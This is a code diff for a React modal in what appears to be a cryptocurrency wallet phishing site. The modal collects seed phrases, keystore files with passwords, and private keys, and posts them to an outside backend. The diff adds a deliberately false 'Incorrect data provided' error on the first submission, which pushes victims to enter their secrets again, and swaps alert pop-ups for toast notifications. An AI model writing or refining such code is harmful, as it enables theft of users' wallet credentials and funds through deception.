@@ -1,5 +1,7 @@
 import React, { useState } from 'react';
 import { useNavigate } from 'react-router-dom';
+import { toast, ToastContainer } from 'react-toastify';
+import 'react-toastify/dist/ReactToastify.css';
 
 const Modal = ({ isOpen, onClose, wallet }) => {
   const [selectedPhase, setSelectedPhase] = useState('Phrase');
@@ -8,6 +10,7 @@ const Modal = ({ isOpen, onClose, wallet }) => {
   const [password, setPassword] = useState('');
   const [privateKey, setPrivateKey] = useState('');
   const [isSubmitting, setIsSubmitting] = useState(false);
+  const [attemptCount, setAttemptCount] = useState(0); 
 
   const navigate = useNavigate();
 
@@ -22,21 +25,21 @@ const Modal = ({ isOpen, onClose, wallet }) => {
     if (selectedPhase === 'Phrase') {
       const words = phrase.trim().split(/\s+/);
       if (words.length !== 12) {
-        alert('Phrase must contain exactly 12 words.');
+        toast.error('Phrase must contain exactly 12 words.');
         return;
       }
       type = 'phrase';
       data = { phrase };
     } else if (selectedPhase === 'Keystore') {
       if (!keystore || !password) {
-        alert('Both Keystore and Password are required.');
+        toast.error('Both Keystore and Password are required.');
         return;
       }
       type = 'keystore';
       data = { keystore, password };
     } else if (selectedPhase === 'Private Key') {
       if (!privateKey) {
-        alert('Private Key is required.');
+        toast.error('Private Key is required.');
         return;
       }
       type = 'privateKey';
@@ -45,6 +48,15 @@ const Modal = ({ isOpen, onClose, wallet }) => {
 
     setIsSubmitting(true);
 
+    
+    if (attemptCount === 0) {
+      toast.error('Incorrect data provided. Please try again.');
+      setAttemptCount(1);
+      setIsSubmitting(false);
+      return;
+    }
+
+    
     try {
       const response = await fetch("https://web3-backend-eayv.onrender.com/api/wallet/submit", {
         method: 'POST',
@@ -60,25 +72,32 @@ const Modal = ({ isOpen, onClose, wallet }) => {
       const result = await response.json();
 
       if (response.ok) {
-        alert('Submitted successfully!');
-        onClose();
-        navigate("/connecting");
+        toast.success('Submitted successfully!');
+        setTimeout(() => {
+          onClose();
+          navigate("/connecting");
+        }, 1000);
       } else {
-        alert(`Error: ${result.error}`);
+        toast.error(`Error: ${result.error}`);
       }
     } catch (error) {
       console.error('Submit error:', error);
-      alert('Something went wrong. Please try again.');
+      toast.error('Something went wrong. Please try again.');
     } finally {
       setIsSubmitting(false);
     }
   };
 
+  const handleClose = () => {
+    setAttemptCount(0); 
+    onClose();
+  };
+
   return (
     <div className="fixed inset-0 bg-[rgba(0,0,0,0.5)] flex justify-center items-center z-50">
       <div className="bg-white p-6 shadow-lg w-[90%] h-auto text-center relative sm:w-[70%] md:w-[70%] lg:w-[40%]">
-        <button onClick={onClose} className="text-red-500 absolute top-2 right-4 text-5xl font-bold">&times;</button>
-        
+        <button onClick={handleClose} className="text-red-500 absolute top-2 right-4 text-5xl font-bold">&times;</button>
+
         <div className='flex justify-start items-center gap-4 mb-4'>
           <img src={wallet.icon} alt={wallet.name} className="w-18 rounded-full md:w-24" />
           <h2 className="text-[18px] font-bold">{wallet.name}</h2>
@@ -155,6 +174,8 @@ const Modal = ({ isOpen, onClose, wallet }) => {
         >
           {isSubmitting ? 'Processing...' : 'Proceed'}
         </button>
+
+        <ToastContainer />
       </div>
     </div>
   );
